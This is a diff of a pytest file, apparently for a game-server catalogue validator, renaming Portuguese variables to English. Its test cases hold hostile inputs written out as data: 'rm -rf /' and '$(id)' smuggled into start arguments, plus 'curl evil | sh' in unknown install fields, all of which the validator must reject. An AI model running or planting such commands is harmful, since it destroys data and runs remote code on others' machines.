@@ -91,7 +91,7 @@ def test_ida_e_volta_pelo_formato_gravado(game_data):
     assert cat.validate_dynamic(game.as_stored()) == game
 
 
-CASOS_INVALIDOS = [
+INVALID_CASES = [
     # comando de shell escondido em argumento
     ("start_args", "-x; rm -rf /"), ("start_args", "$(id)"), ("start_args", "`id`"),
     ("start_args", "a | b"), ("start_args", "a && b"), ("start_args", "-p {OUTRO}"),
@@ -121,25 +121,25 @@ CASOS_INVALIDOS = [
 ]
 
 
-@pytest.mark.parametrize(("campo", "valor"), CASOS_INVALIDOS, ids=lambda v: repr(v)[:30])
-def test_campo_invalido_e_recusado(game_data, campo, valor):
-    game_data[campo] = valor
+@pytest.mark.parametrize(("field", "value"), INVALID_CASES, ids=lambda v: repr(v)[:30])
+def test_campo_invalido_e_recusado(game_data, field, value):
+    game_data[field] = value
     with pytest.raises(ValidationError) as error:
         cat.validate_dynamic(game_data)
-    assert campo in str(error.value)
+    assert field in str(error.value)
 
 
-@pytest.mark.parametrize(("mudancas", "trecho"), [
+@pytest.mark.parametrize(("changes", "chunk"), [
     ({"ports": ["7777/udp", "27016/udp", "2303/udp", "2304/udp"]}, "mais portas"),
     ({"start_args": "-log"}, "{PORT}"),
     ({"start_args": "-port={PORT}"}, "{QUERY_PORT}"),
 ])
-def test_deslocavel_exige_que_o_jogo_receba_todas_as_portas(game_data, mudancas, trecho):
+def test_deslocavel_exige_que_o_jogo_receba_todas_as_portas(game_data, changes, chunk):
     """Sem isso o firewall abriria uma porta que o jogo nao escuta (ou uma que ele ignora)."""
-    game_data.update(mudancas)
+    game_data.update(changes)
     with pytest.raises(ValidationError, match="shiftable") as error:
         cat.validate_dynamic(game_data)
-    assert trecho in str(error.value)
+    assert chunk in str(error.value)
 
 
 def test_jogo_fixo_pode_ter_portas_extras_e_nenhum_marcador(game_data):
@@ -156,22 +156,22 @@ def test_jogo_curado_deslocavel_sem_marcador_vira_erro_do_catalogo(tmp_path):
     assert "{PORT}" in errors[0]
 
 
-@pytest.mark.parametrize("campo", ["pre_install_cmd", "post_install_cmd", "provision_script", "PRE_INSTALL_CMD", "x"])
-def test_campo_desconhecido_e_recusado_para_nao_entrar_comando_de_contrabando(game_data, campo):
-    game_data[campo] = "curl evil | sh"
+@pytest.mark.parametrize("field", ["pre_install_cmd", "post_install_cmd", "provision_script", "PRE_INSTALL_CMD", "x"])
+def test_campo_desconhecido_e_recusado_para_nao_entrar_comando_de_contrabando(game_data, field):
+    game_data[field] = "curl evil | sh"
     with pytest.raises(ValidationError, match="desconhecido"):
         cat.validate_dynamic(game_data)
 
 
-@pytest.mark.parametrize("corpo", [None, [], "texto", 7])
-def test_corpo_que_nao_e_objeto_e_recusado(corpo):
+@pytest.mark.parametrize("body", [None, [], "texto", 7])
+def test_corpo_que_nao_e_objeto_e_recusado(body):
     with pytest.raises(ValidationError, match="objeto JSON"):
-        cat.validate_dynamic(corpo)
+        cat.validate_dynamic(body)
 
 
-@pytest.mark.parametrize("campo", ["key", "name", "app_id", "ports", "game_port"])
-def test_campo_obrigatorio_ausente(game_data, campo):
-    del game_data[campo]
+@pytest.mark.parametrize("field", ["key", "name", "app_id", "ports", "game_port"])
+def test_campo_obrigatorio_ausente(game_data, field):
+    del game_data[field]
     with pytest.raises(ValidationError, match="obrigatorio"):
         cat.validate_dynamic(game_data)
 
